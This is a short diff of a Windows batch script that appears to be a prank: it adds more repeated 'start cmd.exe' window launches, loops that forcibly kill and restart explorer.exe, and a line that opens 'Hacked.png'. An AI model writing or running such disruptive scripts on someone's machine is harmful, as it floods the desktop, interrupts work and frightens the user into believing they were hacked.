@@ -22,6 +22,16 @@ start cmd.exe
 start cmd.exe
 start cmd.exe
 start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
 start calc.exe
 start calc.exe
 start calc.exe
@@ -47,7 +57,8 @@ start explorer.exe
 Timeout 1
 taskkill /f /im explorer.exe
 start explorer.exe
-Timeout 1
+Timeout 2
+Start Hacked.png
 taskkill /f /im explorer.exe
 start explorer.exe
 Timeout 1
